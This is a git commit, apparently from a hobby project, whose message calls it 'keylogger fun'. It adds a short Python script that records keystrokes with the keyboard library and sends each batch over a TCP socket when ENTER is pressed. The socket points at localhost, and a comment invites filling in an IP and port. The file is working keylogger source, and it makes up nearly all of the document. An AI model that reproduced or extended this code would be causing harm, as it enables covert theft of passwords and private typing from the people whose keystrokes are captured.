e4cecaa0d74e29b69a64897647c13107458c4aa6
a1c43my <sk8flowtheengineer@outlook.com>
2022-02-15 06:00:45 -0600

    keylogger fun #R1D32
    simple setup to keep up with keys , each ENTER sends the data. next feature is having the log.py file save the keystrokes  into files after parsing out some things.

---
+++ fun stuff/keys.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python3
+import subprocess,socket,os
+import time,keyboard
+HOST = '127.0.0.1'
+PORT = 4420
+# Configure socket connection
+z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+z.connect((HOST, PORT))
+
+def logging():
+    keys = keyboard.record(until ='ENTER')
+    t = keyboard.play(keys)
+    keyz = str(keys)
+    #print('keys pressed before ENTER')
+    #print(keys)
+    #logging()
+    # Enter IP and Port here
+
+    # Wake up
+    z.send(keyz.encode())
+    logging()
+    
+
+logging()
